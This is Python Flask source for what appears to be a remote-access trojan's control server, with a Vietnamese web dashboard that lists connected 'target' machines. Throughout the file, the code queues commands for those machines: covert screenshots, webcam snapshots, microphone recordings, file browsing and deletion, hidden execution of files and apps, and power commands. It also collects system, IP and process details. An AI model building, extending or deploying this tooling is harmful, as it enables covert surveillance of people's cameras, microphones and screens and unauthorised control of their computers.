import time
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

all_devices_data = {}
screenshot_requests = {}
cam_requests = {}
mic_requests = {}
power_requests = {}
app_launch_requests = {}
file_requests = {}
latest_file_results = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Giám Sát Real-Time Cao Cấp - DevTung</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f1f3f5; font-family: 'Segoe UI', system-ui, sans-serif; }
        .pc-card { background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 15px; border: 1px solid #e9ecef; }
        .pc-header { padding: 18px 24px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        .pc-name { font-weight: 700; color: #1a252f; font-size: 1.2rem; }
        .pc-sub { font-size: 0.85rem; color: #6c757d; }
        .detail-body { padding: 24px; border-top: 1px solid #f1f3f5; background: #fafafa; border-radius: 0 0 12px 12px; }
        .info-title { font-weight: 600; color: #495057; border-bottom: 2px solid #dee2e6; padding-bottom: 5px; margin-top: 15px; }
        .screenshot-img { max-width: 100%; border: 3px solid #343a40; border-radius: 6px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); margin-top: 10px;}
        .status-badge { font-size: 0.8rem; padding: 4px 8px; border-radius: 20px; font-weight: bold; margin-left: 8px; }
        .badge-online { background-color: #d1e7dd; color: #0f5132; }
        .badge-offline { background-color: #f8d7da; color: #842029; }

        .file-explorer-box { background: white; border: 1px solid #dee2e6; border-radius: 8px; padding: 15px; max-height: 400px; overflow-y: auto; }
        .file-item { display: flex; align-items: center; justify-content: space-between; padding: 6px 10px; border-bottom: 1px solid #f1f3f5; font-size: 0.9rem; border-radius: 4px; }
        .file-item:hover { background-color: #f8f9fa; }
        .file-info { cursor: pointer; display: flex; align-items: center; gap: 8px; flex-grow: 1; text-decoration: none; color: #212529; }
        .file-actions { display: flex; gap: 5px; }
        .res-box { background: #fff3cd; border: 1px solid #ffe69c; border-radius: 6px; padding: 10px; font-size: 0.85rem; color: #664d03; }
    </style>
</head>
<body>
    <div class="container py-4">
        <h2 class="text-center mb-4 fw-bold text-uppercase text-dark">📊 Trung Tâm Quản Lý Thiết Bị (DEVTUNGOFFICIAL)</h2>
        <div id="devices-container">
            <div class="text-center text-muted py-5">Đang thiết lập kênh truyền dữ liệu từ trung tâm...</div>
        </div>
    </div>

    <script>
        async function explorePath(pcName, pathString) {
            await fetch('/request-file-action/' + pcName + '?type=list&path=' + encodeURIComponent(pathString), { method: 'POST' });
            setTimeout(() => { renderFileExplorerUI(pcName); }, 800);
        }

        async function executeFileAction(pcName, type, pathString) {
            let confirmMsg = type === 'delete' ? "Xóa vĩnh viễn tệp này?" : "Chạy ẩn tệp này trên máy mục tiêu?";
            if (confirm(confirmMsg)) {
                await fetch('/request-file-action/' + pcName + '?type=' + type + '&path=' + encodeURIComponent(pathString), { method: 'POST' });
                if(type === 'delete') setTimeout(() => { explorePath(pcName, 'ROOT'); }, 1000);
            }
        }

        async function renderFileExplorerUI(pcName) {
            try {
                let res = await fetch('/get-file-data/' + pcName);
                let data = await res.json();
                let box = document.getElementById('file-explorer-' + pcName);
                if(!box) return;

                if (!data || data.status !== "success") {
                    box.innerHTML = `<p class="text-muted small italic text-center py-3">Đang đợi Client gửi cấu trúc file ổ đĩa... (Bấm nút Quét bên trên)</p>`;
                    return;
                }

                let currentPath = data.current_path;
                let html = `<div class="mb-2 d-flex justify-content-between align-items-center">
                    <span class="small fw-bold text-primary text-break">📍 Vị trí: ${currentPath}</span>
                    ${currentPath !== 'ROOT' ? `<button class="btn btn-xs btn-outline-secondary p-1 small" style="font-size:0.75rem" onclick="explorePath('${pcName}', 'ROOT')">⬅️ Về Gốc</button>` : ''}
                </div>`;

                if(data.items.length === 0) html += '<div class="text-center text-muted small py-3">Thư mục trống</div>';

                data.items.forEach(item => {
                    let icon = item.is_dir ? "📁" : "📄";
                    let actionButtons = item.is_dir ?
                        `<button class="btn btn-sm btn-light py-0 px-1 text-primary" onclick="explorePath('${pcName}', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')">Mở 📂</button>` :
                        `<button class="btn btn-sm btn-light py-0 px-1 text-success" onclick="executeFileAction('${pcName}', 'execute', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')">⚡ Chạy ẩn</button>
                         <button class="btn btn-sm btn-light py-0 px-1 text-danger" onclick="executeFileAction('${pcName}', 'delete', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')">🗑️ Xóa</button>`;

                    html += `
                    <div class="file-item">
                        <div class="file-info" onclick="${item.is_dir ? `explorePath('${pcName}', '${item.path.replace(/\\\\/g, '\\\\\\\\')}')` : ''}">
                            <span>${icon}</span>
                            <span class="text-truncate font-monospace" style="max-width: 280px;">${item.name}</span>
                        </div>
                        <div class="file-actions">${actionButtons}</div>
                    </div>`;
                });
                box.innerHTML = html;
            } catch (e) { console.error(e); }
        }

        async function fetchDevicesData() {
            try {
                let response = await fetch('/view-status');
                let devices = await response.json();
                let container = document.getElementById('devices-container');

                if (Object.keys(devices).length === 0) {
                    container.innerHTML = '<div class="text-center text-muted py-5">Chưa có thiết bị nào kích hoạt...</div>';
                    return;
                } else {
                    // Nếu có thiết bị, xóa dòng chữ "Đang thiết lập kênh truyền..." ở lần đầu tiên đi
                    let loadingDiv = container.querySelector('.text-muted.py-5');
                    if (loadingDiv) loadingDiv.remove();
                }

                let currentTime = Math.floor(Date.now() / 1000);

                // Duyệt qua từng máy trong danh sách trả về từ Server
                for (let name in devices) {
                    let info = devices[name];
                    let isOnline = (currentTime - info.timestamp) <= 30;
                    let statusBadge = isOnline ? '<span class="status-badge badge-online">🟢 Online</span>' : '<span class="status-badge badge-offline">🔴 Offline</span>';

                    let ipsHtml = info.all_ips ? info.all_ips.map(ip => `<li>${ip}</li>`).join('') : '<li>No IP</li>';
                    let gpusHtml = info.gpus && info.gpus.length > 0 ? info.gpus.map(g => `<li><strong>${g.name}</strong>: ${g.memory_total}</li>`).join('') : '<li>Không phát hiện GPU rời</li>';
                    let disksHtml = info.disks ? info.disks.map(d => `<li>Ổ <code>${d.device}</code>: Đầy ${d.percentage} (Trống: ${d.free})</li>`).join('') : '';

                    let cpuAppsHtml = info.top_cpu_names ? info.top_cpu_names.map(a => `<li>${a}</li>`).join('') : '<li>Đang tính...</li>';
                    let ramAppsHtml = info.top_ram_names ? info.top_ram_names.map(a => `<li>${a}</li>`).join('') : '<li>Đang tính...</li>';

                    let appOptionsHtml = info.installed_apps_list ? info.installed_apps_list.map(app => `<option value="${app}">${app}</option>`).join('') : '<option value="Radmin VPN">Radmin VPN</option>';
                    let screenshotHtml = info.screenshot ? `<img src="${info.screenshot}" class="screenshot-img" alt="Screen">` : '<p class="text-muted small italic">Chưa có ảnh màn hình...</p>';

                    let camResultHtml = info.cam_result ? (info.cam_result.startsWith("ERROR:") ? `<div class="alert alert-danger p-2 small mt-2">${info.cam_result}</div>` : `<img src="${info.cam_result}" class="screenshot-img" alt="Cam">`) : '<p class="text-muted small italic">Đang đợi lệnh chụp...</p>';
                    let micResultHtml = info.mic_result ? (info.mic_result.startsWith("ERROR:") ? `<div class="alert alert-danger p-2 small mt-2">${info.mic_result}</div>` : `<audio controls class="w-100 mt-2"><source src="${info.mic_result}" type="audio/wav"></audio>`) : '<p class="text-muted small italic">Chưa có tệp ghi âm...</p>';

                    let appExecuteLog = info.app_execute_result ? `<div class="alert alert-info p-2 small mt-2 font-monospace">${info.app_execute_result}</div>` : '<p class="text-muted small italic mb-0">Chưa có bản ghi thực thi.</p>';

                    let cardElem = document.getElementById('card-' + name);

                    // NẾU MÁY CHƯA CÓ TRÊN GIAO DIỆN -> TẠO MỚI NGAY
                    if (!cardElem) {
                        let htmlContent = `
                        <div class="pc-card" id="card-${name}">
                            <div class="pc-header" data-bs-toggle="collapse" data-bs-target="#collapse-${name}">
                                <div>
                                    <span class="pc-name">🖥️ ${name}</span>
                                    <span id="badge-status-${name}">${statusBadge}</span>
                                    <div class="pc-sub">Uptime: <b class="text-primary" id="uptime-${name}">${info.uptime || "Đang tính..."}</b> | Tác vụ: <b class="text-dark" id="tasks-${name}">${info.total_tasks || 0}</b></div>
                                </div>
                                <div class="d-flex align-items-center gap-2" onclick="event.stopPropagation();">
                                    <button class="btn btn-sm btn-danger" onclick="deleteDevice('${name}')">❌ Xóa máy</button>
                                    <button class="btn btn-sm btn-outline-primary" data-bs-toggle="collapse" data-bs-target="#collapse-${name}">Bảng điều khiển</button>
                                </div>
                            </div>

                            <div id="collapse-${name}" class="collapse">
                                <div class="detail-body">
                                    <div class="row">
                                        <div class="col-md-6">
                                            <h5 class="info-title">📂 Quản Lý File & Ổ Đĩa Từ Xa</h5>
                                            <div class="p-2 border bg-light rounded mb-2 d-flex gap-2">
                                                <button class="btn btn-sm btn-dark flex-fill" onclick="explorePath('${name}', 'ROOT')">🔍 Quét Gốc Ổ Đĩa</button>
                                            </div>
                                            <div class="file-explorer-box shadow-sm mb-3" id="file-explorer-${name}">
                                                <p class="text-muted small italic text-center py-3 mb-0">Bấm nút Quét Gốc để nạp file.</p>
                                            </div>

                                            <h5 class="info-title">🚀 Khởi Chạy Ứng Dụng Ngầm (Ẩn UI)</h5>
                                            <div class="p-3 border rounded bg-white mb-3">
                                                <div class="mb-2">
                                                    <label class="small fw-bold text-muted mb-1">Mở app hệ thống đã cài:</label>
                                                    <div class="input-group input-group-sm">
                                                        <select class="form-select text-start" id="app-select-${name}">${appOptionsHtml}</select>
                                                        <button class="btn btn-dark" onclick="launchSelectApp('${name}')">Khởi chạy ngầm</button>
                                                    </div>
                                                </div>
                                                <div>
                                                    <label class="small fw-bold text-muted mb-1">Hoặc nhập tên phần mềm / Đường dẫn file:</label>
                                                    <div class="input-group input-group-sm">
                                                        <input type="text" class="form-select text-start font-monospace" id="app-input-${name}" placeholder="Ví dụ: radmin.exe">
                                                        <button class="btn btn-success" onclick="launchCustomApp('${name}')">Thực thi ẩn</button>
                                                    </div>
                                                </div>
                                                <div class="mt-2" id="app-log-box-${name}">${appExecuteLog}</div>
                                            </div>

                                            <h5 class="info-title">⚡ Lệnh Nguồn Hệ Thống</h5>
                                            <div class="d-flex gap-2 my-2">
                                                <button class="btn btn-warning btn-sm flex-fill" onclick="sendPowerCommand('${name}', 'sleep')">🌙 Sleep Máy</button>
                                                <button class="btn btn-secondary btn-sm flex-fill" onclick="sendPowerCommand('${name}', 'restart')">🔄 Restart Máy</button>
                                                <button class="btn btn-danger btn-sm flex-fill" onclick="sendPowerCommand('${name}', 'shutdown')">🛑 Tắt Máy</button>
                                            </div>
                                        </div>

                                        <div class="col-md-6">
                                            <h5 class="info-title">⚙️ Trạng Thái Hệ Thống</h5>
                                            <ul>
                                                <li><strong>HĐH:</strong> ${info.os} (${info.architecture})</li>
                                                <li><strong>CPU Usage:</strong> <b class="text-danger" id="cpu-usage-${name}">${info.cpu?.current_usage}</b></li>
                                                <li><strong>RAM Usage:</strong> <b class="text-primary" id="ram-usage-${name}">${info.ram?.percentage}</b> <span class="small text-muted" id="ram-detail-${name}">(Dùng: ${info.ram?.used} / ${info.ram?.total})</span></li>
                                                <li><strong>Khởi động:</strong> ${info.boot_time}</li>
                                            </ul>

                                            <div class="res-box my-2 shadow-sm">
                                                <div class="row">
                                                    <div class="col-6">
                                                        <strong class="text-danger">🔥 Top 5 CPU Tải Cao:</strong>
                                                        <ul class="mb-0 ps-3 font-monospace" id="app-cpu-${name}">${cpuAppsHtml}</ul>
                                                    </div>
                                                    <div class="col-6">
                                                        <strong class="text-primary">💾 Top 5 Chiếm RAM:</strong>
                                                        <ul class="mb-0 ps-3 font-monospace" id="app-ram-${name}">${ramAppsHtml}</ul>
                                                    </div>
                                                </div>
                                            </div>

                                            <h5 class="info-title">🌐 Địa Chỉ IP Đang Chạy</h5><ul id="ips-${name}">${ipsHtml}</ul>
                                            <h5 class="info-title">🎮 Card Đồ Họa</h5><ul id="gpus-${name}">${gpusHtml}</ul>
                                            <h5 class="info-title">💾 Ổ Đĩa</h5><ul id="disks-${name}">${disksHtml}</ul>

                                            <h5 class="info-title">📸 Chụp Màn Hình Từ Xa</h5>
                                            <button class="btn btn-primary btn-sm w-100 mb-2" onclick="requestScreenshot('${name}')">Gửi lệnh chụp màn hình</button>
                                            <div class="text-center mb-3" id="screenshot-box-${name}">${screenshotHtml}</div>

                                            <h5 class="info-title">📷 Lựa Chọn & Điều Khiển Camera</h5>
                                            <div class="input-group mb-2">
                                                <select class="form-select form-select-sm" id="cam-select-${name}">${info.cameras ? info.cameras.map(c => `<option value="${c.index}">${c.name}</option>`).join('') : '<option value="0">Camera Mặc định</option>'}</select>
                                                <button class="btn btn-success" onclick="requestCamera('${name}')">Chụp từ Cam này</button>
                                            </div>
                                            <div class="text-center mb-3" id="cam-box-${name}">${camResultHtml}</div>

                                            <h5 class="info-title">🎙️ Ghi Âm Từ Xa</h5>
                                            <div class="input-group mb-2">
                                                <select class="form-select form-select-sm" id="mic-select-${name}">${info.microphones ? info.microphones.map(m => `<option value="${m.index}">${m.name}</option>`).join('') : '<option value="0">Microphone Mặc Định</option>'}</select>
                                                <button class="btn btn-warning btn-sm" onclick="requestMicrophone('${name}')">Thu âm Mic 5s</button>
                                            </div>
                                            <div class="text-center mb-3" id="mic-container-${name}">${micResultHtml}</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>`;
                        container.insertAdjacentHTML('beforeend', htmlContent);
                    } else {
                        // NẾU MÁY ĐÃ CÓ RỒI -> CHỈ CẬP NHẬT REAL-TIME ĐỂ TRÁNH GIẬT LÁC
                        document.getElementById(`badge-status-${name}`).innerHTML = statusBadge;
                        document.getElementById(`uptime-${name}`).innerText = info.uptime || "Đang tính...";
                        document.getElementById(`tasks-${name}`).innerText = info.total_tasks || 0;
                        document.getElementById(`cpu-usage-${name}`).innerText = info.cpu?.current_usage || "0%";
                        document.getElementById(`ram-usage-${name}`).innerText = info.ram?.percentage || "0%";
                        document.getElementById(`ram-detail-${name}`).innerText = `(Dùng: ${info.ram?.used} / ${info.ram?.total})`;

                        document.getElementById(`app-cpu-${name}`).innerHTML = cpuAppsHtml;
                        document.getElementById(`app-ram-${name}`).innerHTML = ramAppsHtml;

                        document.getElementById(`screenshot-box-${name}`).innerHTML = screenshotHtml;
                        document.getElementById(`cam-box-${name}`).innerHTML = camResultHtml;
                        document.getElementById(`app-log-box-${name}`).innerHTML = appExecuteLog;

                        document.getElementById(`ips-${name}`).innerHTML = ipsHtml;
                        document.getElementById(`gpus-${name}`).innerHTML = gpusHtml;
                        document.getElementById(`disks-${name}`).innerHTML = disksHtml;

                        let micBox = document.getElementById(`mic-container-${name}`);
                        if (info.mic_result && !micBox.querySelector('audio') && !info.mic_result.startsWith("ERROR:")) {
                            micBox.innerHTML = micResultHtml;
                        } else if (!info.mic_result) {
                            micBox.innerHTML = micResultHtml;
                        }

                        // CHỈ QUÉT FILE KHI NGƯỜI DÙNG ĐANG MỞ TAB ĐIỀU KHIỂN CỦA MÁY ĐÓ (Tránh nghẽn luồng máy khác)
                        let collapseBox = document.getElementById('collapse-' + name);
                        if (collapseBox && collapseBox.classList.contains('show')) {
                            renderFileExplorerUI(name);
                        }
                    }
                }

                // Kiểm tra xóa card nếu máy bị tắt hoặc xóa khỏi DB ảo
                let existingCards = container.querySelectorAll('.pc-card');
                existingCards.forEach(card => {
                    let cName = card.id.replace('card-', '');
                    if (!devices[cName]) card.remove();
                });

            } catch (error) { console.error("Lỗi API mạng hệ thống:", error); }
        }

        async function sendPowerCommand(pcName, type) {
            let msg = { "sleep": "Đưa máy vào chế độ ngủ?", "restart": "Khởi động lại máy?", "shutdown": "Tắt nguồn máy này?" };
            if (confirm(msg[type])) { await fetch('/request-power/' + pcName + '/' + type, { method: 'POST' }); }
        }

        async function launchSelectApp(pcName) {
            let appName = document.getElementById('app-select-' + pcName).value;
            await fetch('/request-launch-app/' + pcName + '?app=' + encodeURIComponent(appName), { method: 'POST' });
        }

        async function launchCustomApp(pcName) {
            let appName = document.getElementById('app-input-' + pcName).value.trim();
            if(!appName) { alert("Vui lòng gõ tên ứng dụng!"); return; }
            await fetch('/request-launch-app/' + pcName + '?app=' + encodeURIComponent(appName), { method: 'POST' });
        }

        async function requestScreenshot(pcName) { await fetch('/request-screenshot/' + pcName, { method: 'POST' }); }

        async function requestCamera(pcName) {
            let selectedCam = document.getElementById('cam-select-' + pcName).value;
            await fetch('/request-camera/' + pcName + '/' + selectedCam, { method: 'POST' });
        }

        async function requestMicrophone(pcName) {
            let selectedMic = document.getElementById('mic-select-' + pcName).value;
            await fetch('/request-microphone/' + pcName + '/' + selectedMic, { method: 'POST' });
        }

        async function deleteDevice(pcName) {
            if (confirm("Xóa máy " + pcName + "?")) {
                await fetch('/delete-device/' + pcName, { method: 'DELETE' });
                fetchDevicesData();
            }
        }

        setInterval(fetchDevicesData, 2500);
        window.onload = fetchDevicesData;
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/update-status', methods=['POST'])
def update_status():
    global all_devices_data, screenshot_requests, cam_requests, mic_requests, power_requests, app_launch_requests, file_requests, latest_file_results
    data = request.json

    if not data or "computer_name" not in data:
        return jsonify({"status": "error", "message": "Missing computer_name"}), 400

    computer_name = str(data["computer_name"]).strip()

    # Khởi tạo vùng nhớ riêng biệt hoàn toàn cho máy này nếu là máy mới kết nối lần đầu
    if computer_name not in all_devices_data:
        all_devices_data[computer_name] = {}

    # Tạo bản sao dữ liệu mới tinh để xử lý, tránh xung đột vùng nhớ chéo giữa các máy
    device_info = dict(data)
    device_info["timestamp"] = int(time.time())

    if "file_manager_data" in data:
        latest_file_results[computer_name] = data["file_manager_data"]

    # Kế thừa dữ liệu cũ một cách an toàn cho đúng máy đó
    for field in ["screenshot", "cam_result", "mic_result", "app_execute_result"]:
        if field in data and data[field] is not None:
            device_info[field] = data[field]
        elif field in all_devices_data[computer_name]:
            device_info[field] = all_devices_data[computer_name][field]
        else:
            device_info[field] = None

    # Lưu chính xác vào danh mục của máy đó
    all_devices_data[computer_name] = device_info

    # Trả lệnh điều khiển chuẩn xác theo tên máy
    return jsonify({
        "status": "success",
        "trigger_screenshot": screenshot_requests.pop(computer_name, False),
        "trigger_cam_index": cam_requests.pop(computer_name, None),
        "trigger_mic_index": mic_requests.pop(computer_name, None),
        "trigger_power_command": power_requests.pop(computer_name, None),
        "trigger_launch_app": app_launch_requests.pop(computer_name, None),
        "trigger_file_command": file_requests.pop(computer_name, None)
    }), 200
    return jsonify({"status": "error"}), 400

@app.route('/request-file-action/<pc_name>', methods=['POST'])
def request_file_action(pc_name):
    action_type = request.args.get('type')
    path_string = request.args.get('path')
    if action_type and path_string:
        file_requests[pc_name] = {"type": action_type, "path": path_string}
        return jsonify({"status": "file_command_queued"})
    return jsonify({"status": "error"}), 400

@app.route('/get-file-data/<pc_name>', methods=['GET'])
def get_file_data(pc_name):
    return jsonify(latest_file_results.get(pc_name, {"status": "empty"}))

@app.route('/request-power/<pc_name>/<type>', methods=['POST'])
def request_power(pc_name, type):
    if type in ["sleep", "restart", "shutdown"]:
        power_requests[pc_name] = type
        return jsonify({"status": "power_command_queued"})
    return jsonify({"status": "invalid_command"}), 400

@app.route('/request-launch-app/<pc_name>', methods=['POST'])
def request_launch_app(pc_name):
    app_name = request.args.get('app')
    if app_name:
        app_launch_requests[pc_name] = app_name
        return jsonify({"status": "launch_command_queued"})
    return jsonify({"status": "no_app_specified"}), 400

@app.route('/request-screenshot/<pc_name>', methods=['POST'])
def request_screenshot(pc_name):
    screenshot_requests[pc_name] = True
    return jsonify({"status": "requested"})

@app.route('/request-camera/<pc_name>/<int:cam_index>', methods=['POST'])
def request_camera(pc_name, cam_index):
    cam_requests[pc_name] = cam_index
    return jsonify({"status": "requested"})

@app.route('/request-microphone/<pc_name>/<int:mic_index>', methods=['POST'])
def request_microphone(pc_name, mic_index):
    mic_requests[pc_name] = mic_index
    return jsonify({"status": "requested"})

@app.route('/delete-device/<pc_name>', methods=['DELETE'])
def delete_device(pc_name):
    if pc_name in all_devices_data:
        del all_devices_data[pc_name]
        if pc_name in latest_file_results: del latest_file_results[pc_name]
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 404

@app.route('/view-status', methods=['GET'])
def view_status():
    return jsonify(all_devices_data)

if __name__ == '__main__':
    app.run()
